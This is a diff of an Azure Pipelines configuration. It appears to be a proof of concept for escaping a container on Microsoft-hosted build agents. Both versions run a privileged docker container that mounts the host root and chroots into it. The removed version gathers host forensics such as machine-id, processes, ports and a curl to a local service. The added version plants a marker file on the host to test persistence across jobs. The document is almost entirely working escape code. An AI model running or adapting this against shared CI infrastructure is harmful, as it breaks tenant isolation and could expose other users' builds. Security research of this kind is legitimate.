@@ -1,45 +1,78 @@
 # azure-pipelines.yml
-trigger: none
-pool:
-  vmImage: 'ubuntu-22.04'
+trigger:
+- main
+pr:
+- main
 
-steps:
-- bash: |
-    set -euo pipefail
-    mkdir -p artifacts
+name: $(Date:yyyyMMdd)$(Rev:.r)
 
-    echo "Job UTC start: $(date -u '+%Y-%m-%d %H:%M:%S')" | tee artifacts/job-start-utc.txt
+stages:
+- stage: PersistenceProof
+  displayName: 'Final PoC: Test for Cross-Job VM Persistence'
+  jobs:
+  - job: Host_Persistence_Test
+    displayName: 'PoC: Leave and Check for a Persistent Marker'
+    pool:
+      vmImage: 'ubuntu-22.04'
+    steps:
+    - checkout: none
+    - task: Bash@3
+      displayName: 'Capture Host Fingerprint and Test for Persistence'
+      inputs:
+        targetType: inline
+        script: |
+          set -euo pipefail
+          mkdir -p artifacts
+          MARKER_FILE="/persistent_marker.txt"
 
-    # Escape to host with full privileges (expected on Microsoft-hosted Linux)
-    docker run --rm --privileged --network=host --pid=host \
-      -v /:/hostfs -v $(pwd)/artifacts:/artifacts alpine:latest sh -eu -c '
-        apk add --no-cache coreutils util-linux procps curl >/dev/null
+          echo "--- Verifying container escape vector (Prerequisite) ---"
+          if ! (id | grep -q '(docker)'); then
+            echo "❌ Vector not found."
+            exit 1
+          fi
+          echo "✅ Container escape vector is present."
 
-        # 1) Host boot time + PID1 start
-        chroot /hostfs /usr/bin/uptime -s    > /artifacts/host-boot-uptime-s.txt || true
-        chroot /hostfs /usr/bin/who -b       > /artifacts/host-who-boot.txt || true
-        chroot /hostfs /usr/bin/ps -o pid,lstart,cmd -p 1 > /artifacts/host-pid1-start.txt || true
+          echo "--- ESCAPING CONTAINER TO PERFORM HOST FORENSICS ---"
+          
+          docker run --rm --privileged --network=host --pid=host -v /:/hostfs \
+            -v $(pwd)/artifacts:/artifacts \
+            alpine:latest sh -c "
+              # We need root in the chroot jail
+              chroot /hostfs sh -c '
+                set -e
+                
+                echo \"--- [HOST] Capturing stable host fingerprints... ---\"
+                (
+                  echo -n \"machine-id: \"
+                  cat /etc/machine-id
+                  echo -n \"boot_id: \"
+                  cat /proc/sys/kernel/random/boot_id
+                ) > /artifacts/host-fingerprint.txt
 
-        # 2) Stable host fingerprint across runs?
-        chroot /hostfs /bin/cat /etc/machine-id > /artifacts/host-machine-id.txt || true
-        chroot /hostfs /usr/bin/hostnamectl    > /artifacts/host-hostnamectl.txt || true
+                echo \"--- [HOST] Checking for residual marker from a PREVIOUS run... ---\"
+                if [ -f \"${MARKER_FILE}\" ]; then
+                  echo \"✅✅✅ SMOKING GUN: RESIDUAL MARKER FOUND\" > /artifacts/persistence_verdict.txt
+                  echo \"Contents of the marker from the previous run:\" >> /artifacts/persistence_verdict.txt
+                  cat \"${MARKER_FILE}\" >> /artifacts/persistence_verdict.txt
+                else
+                  echo \"ℹ️ Marker not found, host appears to be fresh.\" > /artifacts/persistence_verdict.txt
+                fi
 
-        # 3) Process start times for “mono”/“php-fpm”
-        chroot /hostfs /usr/bin/ps -eo pid,lstart,user,cmd | grep -E "xsp4|php-fpm" \
-          > /artifacts/host-web-procs.txt || true
+                echo \"--- [HOST] Creating a new marker for the NEXT run... ---\"
+                (
+                  echo \"Marker created by Build Number: ${BUILD_BUILDNUMBER}\"
+                  echo \"Timestamp (UTC): $(date -u +\"%Y-%m-%d %H:%M:%S\")\"
+                ) > \"${MARKER_FILE}\"
+                echo \"Successfully created ${MARKER_FILE} for a future run to find.\"
+              '
+            "
+          
+          echo "--- ANALYSIS & VERDICT ---"
+          cat artifacts/persistence_verdict.txt
 
-        # 4) Network proof: is XSP actually listening?
-        chroot /hostfs /usr/bin/ss -plnt > /artifacts/host-listen-ports.txt || true
-        ( chroot /hostfs /usr/bin/curl -i --max-time 2 http://127.0.0.1:8084/ || true ) \
-          > /artifacts/xsp-8084-response.txt
-
-        # 5) Residual-file test: create a unique marker (run A), check existence (run B)
-        [ -f /hostfs/marker-from-previous-run.txt ] && echo "FOUND prior marker" \
-          > /artifacts/residual-marker.txt || echo "No prior marker" > /artifacts/residual-marker.txt
-        echo "marker $(date -u '+%Y-%m-%dT%H:%M:%SZ') $$" > /hostfs/marker-from-previous-run.txt
-      '
-  displayName: "Forensic: host timeline & isolation checks"
-- task: PublishPipelineArtifact@1
-  inputs:
-    targetPath: artifacts
-    artifact: forensic-proof
+    - task: PublishPipelineArtifact@1
+      displayName: 'Publish Persistence Test Artifacts'
+      condition: always()
+      inputs:
+        targetPath: 'artifacts'
+        artifact: 'azure-persistence-proof'
